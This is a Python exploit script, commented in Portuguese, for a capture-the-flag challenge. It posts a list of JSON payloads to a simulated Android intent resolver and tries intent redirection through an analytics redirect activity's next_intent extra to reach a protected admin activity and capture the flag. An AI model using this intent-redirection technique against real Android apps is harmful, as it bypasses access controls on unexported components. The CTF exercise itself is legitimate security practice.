#!/usr/bin/env python3
import json
import os
import re
import requests

# Alvo do desafio. Pode ser sobrescrito por variável de ambiente TARGET.
TARGET = os.environ.get("TARGET", "https://d0e8d6da104e26fb.chal.ctf.ae").rstrip("/")

# Endpoint que simula o Android intent resolver.
URL = f"{TARGET}/api/intent/send"

# Regex padrão para capturar flag no corpo das respostas.
FLAG_RE = re.compile(r"flag\{[^}\r\n]+\}", re.IGNORECASE)

# Lista de payloads com formatos diferentes de next_intent.
# A ideia é descobrir como o simulador representa um Parcelable Intent dentro do JSON.
PAYLOADS = [
    (
        "controle: tentativa direta no AdminPanelActivity",
        {
            "component": "com.fluidctf.messenger.AdminPanelActivity",
            "extras": {}
        }
    ),
    (
        "redirect: next_intent com component full_name",
        {
            "component": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
            "extras": {
                "next_intent": {
                    "component": "com.fluidctf.messenger.AdminPanelActivity"
                }
            }
        }
    ),
    (
        "redirect: next_intent com component relativo",
        {
            "component": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
            "extras": {
                "next_intent": {
                    "component": ".AdminPanelActivity"
                }
            }
        }
    ),
    (
        "redirect: next_intent com formato package/class",
        {
            "component": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
            "extras": {
                "next_intent": {
                    "component": "com.fluidctf.messenger/.AdminPanelActivity"
                }
            }
        }
    ),
    (
        "redirect: next_intent com package e class separados",
        {
            "component": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
            "extras": {
                "next_intent": {
                    "package": "com.fluidctf.messenger",
                    "class": "com.fluidctf.messenger.AdminPanelActivity"
                }
            }
        }
    ),
    (
        "redirect: next_intent como string full_name",
        {
            "component": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
            "extras": {
                "next_intent": "com.fluidctf.messenger.AdminPanelActivity"
            }
        }
    ),
]

def post_payload(label, payload):
    print()
    print("=" * 90)
    print(label)
    print("=" * 90)

    print("[*] Payload:")
    print(json.dumps(payload, indent=2, ensure_ascii=False))

    response = requests.post(
        URL,
        headers={"Content-Type": "application/json"},
        json=payload,
        timeout=15,
        verify=False,
    )

    print()
    print("[*] Status HTTP:", response.status_code)
    print("[*] Corpo:")
    print(response.text)

    # Salva cada tentativa em JSONL para consulta posterior no writeup.
    with open("loot/script1_results.jsonl", "a", encoding="utf-8") as f:
        f.write(json.dumps({
            "label": label,
            "payload": payload,
            "status_code": response.status_code,
            "body": response.text,
        }, ensure_ascii=False) + "\n")

    match = FLAG_RE.search(response.text)
    if match:
        flag = match.group(0)
        print()
        print("[+] FLAG ENCONTRADA:", flag)

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        return True

    return False

def main():
    os.makedirs("loot", exist_ok=True)

    # Limpa resultados antigos desta rodada.
    open("loot/script1_results.jsonl", "w", encoding="utf-8").close()

    print("[*] Target:", TARGET)
    print("[*] Endpoint:", URL)

    for label, payload in PAYLOADS:
        if post_payload(label, payload):
            print("[+] Flag salva em flag.txt")
            return

    print()
    print("[-] Nenhuma flag encontrada nesta rodada.")
    print("[*] Próximo passo: analisar as mensagens de erro para ajustar o formato do next_intent.")

if __name__ == "__main__":
    # Desativa apenas o warning visual do verify=False em ambiente CTF.
    requests.packages.urllib3.disable_warnings()
    main()
